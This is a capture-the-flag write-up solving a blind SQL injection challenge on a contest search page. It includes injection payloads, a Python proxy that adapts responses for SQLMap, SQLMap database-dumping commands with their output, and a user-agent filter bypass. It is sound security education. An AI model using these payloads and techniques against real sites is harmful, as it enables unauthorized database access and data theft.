# Bird Box Challenge
Web, 478 points

## Description:

> We've got Aggies, Trucks, and Eggs!

The description included a picture of Sandra Bullock blindfolded, from the movie [Bird Box](https://en.wikipedia.org/wiki/Bird_Box_(film)).

A website with a search engine was linked to.

```html
<img src='TAMU_CTF.png'>
<div>
    <form action='Search.php' autocomplete='off' id='search' method='get' accept-charset='UTF-8'>
        <h1>Search Me!</h1>
        <input type="text" name="Search" placeholder="Yonder Text Goes Here">
        </br>
        <input type="Submit" value="Submit" id="submit">
    <form/>
</div>
```

## Solution:

Trying to search for a random value, we get:
```console
root@kali:/media/sf_CTFs/tamu/Bird_Box# curl -v http://web2.tamuctf.com/Search.php?Search=test
*   Trying 34.208.211.186...
* TCP_NODELAY set
* Connected to web2.tamuctf.com (34.208.211.186) port 80 (#0)
> GET /Search.php?Search=test HTTP/1.1
> Host: web2.tamuctf.com
> User-Agent: curl/7.61.0
> Accept: */*
>
< HTTP/1.1 500 Internal Server Error
< Server: nginx/1.15.8
< Date: Tue, 12 Mar 2019 20:52:37 GMT
< Content-Type: text/html; charset=UTF-8
< Content-Length: 212
< Connection: keep-alive
<
* Connection #0 to host web2.tamuctf.com left intact
<html><head><style>img{ display: block; margin-left: auto; margin-right: auto; width: 75%; height: 75%;}h1{ text-align: center; }</style></head></br><h1>Our search isn't THAT good...</h1></br><img src='Ehhh.png'>
```

Error 500 with a message that "Our search isn't THAT good...".

The description hinted strongly that we are searching for a boolean-blind SQL injection, so let's start by manually fuzzing the `Search` parameter.

After trying different payloads, the following input suddenly gave a different result:
```console
root@kali:/media/sf_CTFs/tamu/Bird_Box# curl -v "http://web2.tamuctf.com/Search.php?Search='or'1'='1"
*   Trying 34.208.211.186...
* TCP_NODELAY set
* Connected to web2.tamuctf.com (34.208.211.186) port 80 (#0)
> GET /Search.php?Search='or'1'='1 HTTP/1.1
> Host: web2.tamuctf.com
> User-Agent: curl/7.61.0
> Accept: */*
>
< HTTP/1.1 500 Internal Server Error
< Server: nginx/1.15.8
< Date: Tue, 12 Mar 2019 21:00:21 GMT
< Content-Type: text/html; charset=UTF-8
< Content-Length: 220
< Connection: keep-alive
<
* Connection #0 to host web2.tamuctf.com left intact
<html><head><style>img{ display: block; margin-left: auto; margin-right: auto; width: 75%; height: 75%;}h1{ text-align: center; }</style></head></br><h1>Nice try, nothing to see here.</h1></br><img src='Nice_Going!.gif'>
```

Again Error 500, but with a different error message: "Nice try, nothing to see here". 

Let's perform a sanity check and try with `'or'2'='1` instead of `'or'1'='1`:

```console
root@kali:/media/sf_CTFs/tamu/Bird_Box# curl "http://web2.tamuctf.com/Search.php?Search='or'2'='1"
<html><head><style>img{ display: block; margin-left: auto; margin-right: auto; width: 75%; height: 75%;}h1{ text-align: center; }</style></head></br><h1>Our search isn't THAT good...</h1></br><img src='Ehhh.png'>
```

Back to "Our search isn't THAT good" - so we have some kind of boolean condition here! A true statement gives us one error message, a false gives another.

Time to fire up SQLMap and automatically dump the DB. However, in this case, SQLMap was having trouble exploiting the vulnerability.

At first I thought that SQLMap just isn't finding the correct syntax needed for the exploit, so I tried helping it out with an idea based on something I read [here](http://pentestmonkey.net/blog/exploiting-a-tricky-sql-injection-with-sqlmap).

It turns out the SQLMap has a feature called "Arbitrary Injection Points":

> Similar to URI injection point, asterisk (*) can also be used to point to the arbitrary injection point inside GET, POST or HTTP headers. Injection point can be specified by marking it inside the GET parameter value(s) provided with option -u, POST parameter value(s) provided with option --data, HTTP header value(s) provided with options -H, --headers, --user-agent, --referer and/or --cookie, or at generic place inside HTTP request loaded from file with option -r.

In our case, we need to find some kind of SQL syntax that SQLMap could easily fit its payload into.

I started with the following payload:
```
' or case when 1=1 then 1 else 0 end='1
```

This gives us the "True" page:
```console
root@kali:/media/sf_CTFs/tamu/Bird_Box# curl http://web2.tamuctf.com/Search.php?Search=%27%20or%20case%20when%201=1%20then%201%20else%200%20end=%271
<html><head><style>img{ display: block; margin-left: auto; margin-right: auto; width: 75%; height: 75%;}h1{ text-align: center; }</style></head></br><h1>Nice try, nothing to see here.</h1></br><img src='Nice_Going!.gif'>
```

Explanation: Since `1=1` the case `case when 1=1 then 1 else 0 end` translates to `1` and the complete expression becomes `' or 1='1`, like before.

Now, we can insert the SQLMap payload in the following location, denoted by `*`:
```
' or case when 1=1 * then 1 else 0 end='1
```

SQLMap performs boolean-based attacks by trying payloads such as:
```
and (SELECT LENGTH(database()))=1
and (SELECT LENGTH(database()))=2
...
and (SELECT LENGTH(database()))=6
...
```

So, if SQLMap sends a "True" payload such as `and 2=2`, the expression will map to True, and otherwise (e.g. `and 2=3`) it will map to False.

Now, when SQLMap identifies the `*` in the URL, it asks if it should be used as a custom injection marker and if so - injects its payload to that exact location.

However, this still didn't work, and it looked like the fact that the website keeps returning Error 500s is throwing SQLMap off.

To overcome this, I decided to create a proxy and "translate" the different responses into data that SQLMap can work with.

This is the proxy I used:

```python
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import SocketServer
from urlparse import urlparse
import requests

class S(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        self._set_headers()
        query = urlparse(self.path).query
        r = requests.get("http://web2.tamuctf.com/Search.php?Search=' or case when 1=1 {} then 1 else 0 end='1".format(query))
        self.wfile.write("<html><body>{}</body></html>".format("Ehhh.png" in r.text))

    def do_HEAD(self):
        self._set_headers()
        
    def do_POST(self):
        self._set_headers()
        self.wfile.write("<html><body><h1>POST!</h1></body></html>")
        
def run(server_class=HTTPServer, handler_class=S, port=8000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print ('Starting httpd...')
    httpd.serve_forever()

if __name__ == "__main__":
    from sys import argv

    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()
```

It launches a webserver which accepts a single parameter and passes it on to our vulnerable website. It later parses the response and decides if it is a true response or a false one. This is reflected by printing "True" or "False" in the body. In addition, SQLMap gets a "200 OK" response like it's used to.

Now, the SQLMap command to be used is:
```
sqlmap -u "http://localhost:8000/?*" --dbms=MySQL --technique=B
```

In the command, I've explicitly specified the technique to be used: Boolean blind attacks. 

After running the attack, I finally got:
```console
root@kali:/media/sf_CTFs/tamu/Onboarding_Checklist# sqlmap -u "http://localhost:8000/?*" --dbms=MySQL --technique=B
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.2.5#stable}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 00:15:13

custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] y
[00:15:15] [INFO] testing connection to the target URL
[00:15:16] [INFO] heuristics detected web page charset 'ascii'
[00:15:16] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[00:15:16] [INFO] testing if the target URL content is stable
[00:15:17] [INFO] target URL content is stable
[00:15:17] [INFO] testing if URI parameter '#1*' is dynamic
[00:15:17] [INFO] confirming that URI parameter '#1*' is dynamic
[00:15:18] [INFO] URI parameter '#1*' is dynamic
[00:15:19] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[00:15:19] [INFO] testing for SQL injection on URI parameter '#1*'
[00:15:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[00:15:22] [INFO] URI parameter '#1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
[00:15:22] [INFO] checking if the injection point on URI parameter '#1*' is a false positive
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 12 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://localhost:8000/? AND 5842=5842
---
[00:15:31] [INFO] testing MySQL
[00:15:32] [INFO] confirming MySQL
[00:15:34] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0
[00:15:34] [INFO] fetched data logged to text files under '/root/.sqlmap/output/localhost'

[*] shutting down at 00:15:34

root@kali:/media/sf_CTFs/tamu/Onboarding_Checklist# sqlmap -u "http://localhost:8000/?*" --dbms=MySQL --technique=B  --dbs
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.2.5#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 00:16:25

y
[00:16:30] [INFO] testing connection to the target URL
[00:16:30] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://localhost:8000/? AND 5842=5842
---
[00:16:30] [INFO] testing MySQL
[00:16:30] [INFO] confirming MySQL
[00:16:30] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0
[00:16:30] [INFO] fetching database names
[00:16:30] [INFO] fetching number of databases
[00:16:30] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[00:16:30] [INFO] retrieved: 2
[00:16:34] [INFO] retrieved: information_schema
[00:17:40] [INFO] retrieved: SqliDB
available databases [2]:
[*] information_schema
[*] SqliDB

[00:18:05] [INFO] fetched data logged to text files under '/root/.sqlmap/output/localhost'

[*] shutting down at 00:18:05




root@kali:/media/sf_CTFs/tamu/Onboarding_Checklist# sqlmap -u "http://localhost:8000/?*" --dbms=MySQL --technique=B  -D SqliDB --tables
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.2.5#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 00:18:55

custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] y
[00:18:58] [INFO] testing connection to the target URL
[00:18:59] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://localhost:8000/? AND 5842=5842
---
[00:18:59] [INFO] testing MySQL
[00:18:59] [INFO] confirming MySQL
[00:18:59] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0
[00:18:59] [INFO] fetching tables for database: 'SqliDB'
[00:18:59] [INFO] fetching number of tables for database 'SqliDB'
[00:18:59] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[00:18:59] [INFO] retrieved: 1
[00:19:02] [INFO] retrieved: Search
Database: SqliDB
[1 table]
+--------+
| Search |
+--------+

[00:19:26] [INFO] fetched data logged to text files under '/root/.sqlmap/output/localhost'

[*] shutting down at 00:19:26




root@kali:/media/sf_CTFs/tamu/Onboarding_Checklist# sqlmap -u "http://localhost:8000/?*" --dbms=MySQL --technique=B  -D SqliDB -T Search --columns
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.2.5#stable}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 00:19:55

custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] y
[00:19:57] [INFO] testing connection to the target URL
[00:19:58] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://localhost:8000/? AND 5842=5842
---
[00:19:58] [INFO] testing MySQL
[00:19:58] [INFO] confirming MySQL
[00:19:58] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0
[00:19:58] [INFO] fetching columns for table 'Search' in database 'SqliDB'
[00:19:58] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[00:19:58] [INFO] retrieved: 1
[00:20:01] [INFO] retrieved: items
[00:20:21] [INFO] retrieved: varchar(100)
Database: SqliDB
Table: Search
[1 column]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| items  | varchar(100) |
+--------+--------------+

[00:21:08] [INFO] fetched data logged to text files under '/root/.sqlmap/output/localhost'

[*] shutting down at 00:21:08


root@kali:/media/sf_CTFs/tamu/Onboarding_Checklist# sqlmap -u "http://localhost:8000/?*" --dbms=MySQL --technique=B  -D SqliDB -T Search --dump
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.2.5#stable}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 00:21:31

custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] y
[00:21:33] [INFO] testing connection to the target URL
[00:21:34] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://localhost:8000/? AND 5842=5842
---
[00:21:34] [INFO] testing MySQL
[00:21:34] [INFO] confirming MySQL
[00:21:34] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0
[00:21:34] [INFO] fetching columns for table 'Search' in database 'SqliDB'
[00:21:34] [INFO] resumed: 1
[00:21:34] [INFO] resumed: items
[00:21:34] [INFO] fetching entries for table 'Search' in database 'SqliDB'
[00:21:34] [INFO] fetching number of entries for table 'Search' in database 'SqliDB'
[00:21:34] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[00:21:34] [INFO] retrieved: 3
[00:21:38] [INFO] retrieved: Aggies
[00:22:01] [INFO] retrieved: Eggs
[00:22:18] [INFO] retrieved: Trucks
Database: SqliDB
Table: Search
[3 entries]
+--------+
| items  |
+--------+
| Aggies |
| Eggs   |
| Trucks |
+--------+

[00:22:41] [INFO] table 'SqliDB.Search' dumped to CSV file '/root/.sqlmap/output/localhost/dump/SqliDB/Search.csv'
[00:22:41] [INFO] fetched data logged to text files under '/root/.sqlmap/output/localhost'

[*] shutting down at 00:22:41
```

So there are three items in the table: Aggies, Eggs and Trucks.

Searching for them indeed returns a response, instead of the regular error 500:

```console
root@kali:/media/sf_CTFs/tamu/Bird_Box# curl web2.tamuctf.com/Search.php?Search=Aggies
<html><head><style>img{ display: block; margin-left: auto; margin-right: auto; width: 75%; height: 75%;}h1{ text-align: center; }</style></head></br><h1>Aggies</h1></br><img src='Best_Aggie.png'>root@kali:/media/sf_CTFs/tamu/Bird_Box# curl web2.tamuctf.com/Search.php?Search=Eggs
<html><head><style>img{ display: block; margin-left: auto; margin-right: auto; width: 75%; height: 75%;}h1{ text-align: center; }</style></head></br><h1>Eggs</h1></br><img src='Happy_Eggs.png'>root@kali:/media/sf_CTFs/tamu/Bird_Box# curl web2.tamuctf.com/Search.php?Search=Trucks
<html><head><style>img{ display: block; margin-left: auto; margin-right: auto; width: 75%; height: 75%;}h1{ text-align: center; }</style></head></br><h1>Trucks</h1></br><img src='Best_Truck.png'>
```

I tried searching the images for some stego clues, with no success.

At last, I went back to the description, looking for clues:

> We've got Aggies, Trucks, and Eggs!

Well, it turns out that the path to Aggies, Trucks and Eggs should have been much shorter than the one I took. The answer must be hiding elsewhere.

With not much left to work with, I tried to dump the complete DB:

```console
root@kali:/media/sf_CTFs/tamu/Bird_Box# sqlmap -u "http://localhost:8000/?*" --dbms=MySQL --technique=B  --all
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.2.5#stable}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 00:44:34

custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] y
[00:44:36] [INFO] testing connection to the target URL
[00:44:36] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://localhost:8000/? AND 5842=5842
---
[00:44:36] [INFO] testing MySQL
[00:44:36] [INFO] confirming MySQL
[00:44:36] [INFO] the back-end DBMS is MySQL
[00:44:36] [INFO] fetching banner
[00:44:36] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[00:44:36] [INFO] retrieved: 5.7.25-0ubuntu0.18.04.2
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL >= 5.0.0
banner:    '5.7.25-0ubuntu0.18.04.2'
[00:45:13] [INFO] fetching current user
[00:45:13] [INFO] retrieved: gigem{w3_4r3_th3_4ggi3s}@localhost
current user:    'gigem{w3_4r3_th3_4ggi3s}@localhost'
[00:46:05] [INFO] fetching current database
[00:46:05] [INFO] retrieved: SqliDB
current database:    'SqliDB'
[00:46:30] [INFO] fetching server hostname
[00:46:30] [INFO] retrieved: 18dfee95a5d1
hostname:    '18dfee95a5d1'
[00:47:21] [INFO] testing if current user is DBA
[00:47:21] [INFO] fetching current user
current user is DBA:    False
[00:47:22] [INFO] fetching database users
[00:47:22] [INFO] fetching number of database users
[00:47:22] [INFO] retrieved: 1
[00:47:25] [INFO] retrieved: 'gigem{w3_4r3_th3_4ggi3s}'@'localhost'
database management system users [1]:
[*] 'gigem{w3_4r3_th3_4ggi3s}'@'localhost'
[00:48:03] [ERROR] user aborted

```

The flag hid as the DB user: gigem{w3_4r3_th3_4ggi3s}



## Update

From reading another writeup ([link](https://medium.com/@noobintheshell/tamuctf2019-writeups-1-360f53008f7a)) it turns out that the reason SQLMap failed is because the SQLMap user agent was being blocked. This explains why the proxy resolved the issue.

The easy way to bypass this was using the `--random-agent` option:
```console
root@kali:/media/sf_CTFs/tamu/# sqlmap -u http://web2.tamuctf.com/Search.php?Search=1 --random-agent  --dbms=MySQL --technique=B --level 5 --risk 3
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.2.5#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 22:44:20

[22:44:20] [INFO] fetched random HTTP User-Agent header value 'Opera/9.00 (Windows NT 5.2; U; pl)' from file '/usr/share/sqlmap/txt/user-agents.txt'
[22:44:25] [INFO] testing connection to the target URL
[22:44:26] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
[22:44:26] [INFO] testing if the target URL content is stable
[22:44:26] [INFO] target URL content is stable
[22:44:26] [INFO] testing if GET parameter 'Search' is dynamic
[22:44:27] [WARNING] GET parameter 'Search' does not appear to be dynamic
[22:44:27] [WARNING] heuristic (basic) test shows that GET parameter 'Search' might not be injectable
[22:44:27] [INFO] testing for SQL injection on GET parameter 'Search'
[22:44:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[22:45:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[22:45:08] [INFO] GET parameter 'Search' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable (with --string="see")
[22:45:08] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
[22:45:08] [INFO] checking if the injection point on GET parameter 'Search' is a false positive
GET parameter 'Search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 163 HTTP(s) requests:
---
Parameter: Search (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: Search=-4471' OR 9364=9364-- tPIF
---
[22:45:21] [INFO] testing MySQL
[22:45:21] [INFO] confirming MySQL
[22:45:22] [INFO] the back-end DBMS is MySQL
web application technology: Nginx
back-end DBMS: MySQL >= 5.0.0
[22:45:22] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 130 times
[22:45:22] [INFO] fetched data logged to text files under '/root/.sqlmap/output/web2.tamuctf.com'

[*] shutting down at 22:45:22
```